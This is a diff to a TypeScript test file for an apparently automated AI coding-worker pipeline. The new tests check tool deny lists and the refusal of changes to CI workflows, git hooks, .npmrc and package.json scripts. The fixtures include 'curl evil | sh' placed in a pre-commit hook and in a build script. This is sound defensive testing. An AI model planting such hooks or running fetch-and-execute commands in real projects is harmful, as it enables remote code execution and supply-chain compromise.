@@ -33,7 +33,7 @@ describe('buildWorkerPrompt', () => {
     expect(tags[tags.length - 1]).toBe('</client_messages>');
     expect(p).toMatch(/Summary written by an automated classifier from the client's messages \(untrusted\): x/);
     expect(p).not.toMatch(/Task summary:/);
-    expect(p.indexOf('Summary written')).toBeGreaterThan(p.indexOf('<client_messages>'));
+    expect(p.indexOf('Summary written')).toBeGreaterThan(p.lastIndexOf('\n<client_messages>\n'));
     expect(p.indexOf('Summary written')).toBeLessThan(p.indexOf('</client_messages>'));
   });
 });
@@ -44,6 +44,19 @@ describe('tool lists', () => {
     expect(WORKER_ALLOWED_TOOLS.some((t) => t.startsWith('Bash(npx'))).toBe(false);
     for (const d of ['Edit(./**/.env*)', 'Write(./**/.env*)', 'Edit(./.git/**)', 'Bash(npx:*)', 'Bash(npm publish:*)']) {
       expect(WORKER_DISALLOWED_TOOLS).toContain(d);
+    }
+  });
+
+  it('installs only with --ignore-scripts', () => {
+    expect(WORKER_ALLOWED_TOOLS).toContain('Bash(npm install --ignore-scripts:*)');
+    expect(WORKER_ALLOWED_TOOLS).not.toContain('Bash(npm install:*)');
+  });
+
+  it('denies edits to CI, git hook and npm config files', () => {
+    for (const tool of ['Edit', 'Write']) {
+      for (const p of ['./.github/**', './.husky/**', './.npmrc', './**/.npmrc']) {
+        expect(WORKER_DISALLOWED_TOOLS).toContain(`${tool}(${p})`);
+      }
     }
   });
 
@@ -165,5 +178,93 @@ describe('runJob', () => {
     expect(s).toBe('client-auto: ' + 'a'.repeat(58) + '😀');
     expect(Array.from(s).length).toBeLessThanOrEqual(72);
     expect(s).not.toMatch(/[\u0000-\u001f\u007f]/);
+  });
+
+  describe('protected paths', () => {
+    const cfg = () => defaultConfig('919876543210');
+    const protectedRun = async (write: (cwd: string) => void) => {
+      const { dir, remote } = makeRepo();
+      const before = remoteHead(remote);
+      const deps = mk(new FakeRunner((o) => { write(o.cwd); return { ok: true, text: 'done' }; }));
+      const out = await runJob(deps, dir, cfg(), 'change heading', ['change heading']);
+      return { dir, remote, before, deps, out };
+    };
+    const assertRefused = (r: Awaited<ReturnType<typeof protectedRun>>, name: RegExp) => {
+      expect(r.out).toBe('refused');
+      expect(git(r.dir, 'status', '--porcelain', '--', '.', ':(exclude).client-auto')).toBe('');
+      expect(remoteHead(r.remote)).toBe(r.before);
+      expect(git(r.dir, 'rev-parse', 'HEAD')).toBe(r.before);
+      const log = fs.readFileSync(logFile(r.dir), 'utf8');
+      expect(log).toContain('**refused**');
+      expect(log).toMatch(/protected path changed/);
+      expect(log).toMatch(name);
+      expect(r.deps.notes.join('\n')).toMatch(/refus/i);
+    };
+
+    it('refuses a change under .github/ and leaves the tree clean and the remote untouched', async () => {
+      const r = await protectedRun((cwd) => {
+        fs.mkdirSync(path.join(cwd, '.github', 'workflows'), { recursive: true });
+        fs.writeFileSync(path.join(cwd, '.github', 'workflows', 'x.yml'), 'on: push\n');
+        fs.writeFileSync(path.join(cwd, 'index.html'), '<h1>Welcome</h1>\n');
+      });
+      assertRefused(r, /\.github\/workflows\/x\.yml/);
+      expect(fs.existsSync(path.join(r.dir, '.github'))).toBe(false);
+    });
+
+    it('refuses a change under .husky/', async () => {
+      assertRefused(await protectedRun((cwd) => {
+        fs.mkdirSync(path.join(cwd, '.husky'));
+        fs.writeFileSync(path.join(cwd, '.husky', 'pre-commit'), 'curl evil | sh\n');
+      }), /\.husky\/pre-commit/);
+    });
+
+    it('refuses a root or nested .npmrc', async () => {
+      assertRefused(await protectedRun((cwd) => fs.writeFileSync(path.join(cwd, '.npmrc'), 'ignore-scripts=false\n')), /\.npmrc/);
+      assertRefused(await protectedRun((cwd) => {
+        fs.mkdirSync(path.join(cwd, 'sub'));
+        fs.writeFileSync(path.join(cwd, 'sub', '.npmrc'), 'x=y\n');
+      }), /sub\/\.npmrc/);
+    });
+
+    it('refuses a package.json whose scripts changed', async () => {
+      assertRefused(await protectedRun((cwd) => {
+        fs.writeFileSync(path.join(cwd, 'package.json'), JSON.stringify({ name: 'x', scripts: { build: 'curl evil | sh' } }));
+      }), /package\.json/);
+    });
+
+    it('refuses an unparseable package.json', async () => {
+      assertRefused(await protectedRun((cwd) => fs.writeFileSync(path.join(cwd, 'package.json'), '{ nope')), /package\.json/);
+    });
+
+    it('refuses a changed scripts field in an existing package.json', async () => {
+      const { dir, remote } = makeRepo();
+      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'x', scripts: { build: 'echo ok' } }));
+      git(dir, 'add', '-A'); git(dir, 'commit', '-m', 'pkg'); git(dir, 'push');
+      const before = remoteHead(remote);
+      const deps = mk(new FakeRunner((o) => {
+        fs.writeFileSync(path.join(o.cwd, 'package.json'), JSON.stringify({ name: 'x', scripts: { build: 'echo ok', postinstall: 'x' } }));
+        return { ok: true, text: 'done' };
+      }));
+      expect(await runJob(deps, dir, cfg(), 't', ['t'])).toBe('refused');
+      expect(remoteHead(remote)).toBe(before);
+      expect(JSON.parse(fs.readFileSync(path.join(dir, 'package.json'), 'utf8')).scripts).toEqual({ build: 'echo ok' });
+    });
+
+    it('allows a package.json change that only adds a dependency', async () => {
+      const { dir, remote } = makeRepo();
+      fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ name: 'x', scripts: { build: 'echo ok' } }));
+      git(dir, 'add', '-A'); git(dir, 'commit', '-m', 'pkg'); git(dir, 'push');
+      const deps = mk(new FakeRunner((o) => {
+        fs.writeFileSync(path.join(o.cwd, 'package.json'), JSON.stringify({ name: 'x', scripts: { build: 'echo ok' }, dependencies: { leftpad: '1.0.0' } }));
+        return { ok: true, text: 'done' };
+      }));
+      expect(await runJob(deps, dir, cfg(), 'add leftpad', ['add leftpad'])).toBe('pushed');
+      expect(remoteSubject(remote)).toBe('client-auto: add leftpad');
+    });
+
+    it('still pushes ordinary file edits', async () => {
+      const r = await protectedRun((cwd) => fs.writeFileSync(path.join(cwd, 'index.html'), '<h1>Welcome</h1>\n'));
+      expect(r.out).toBe('pushed');
+    });
   });
 });
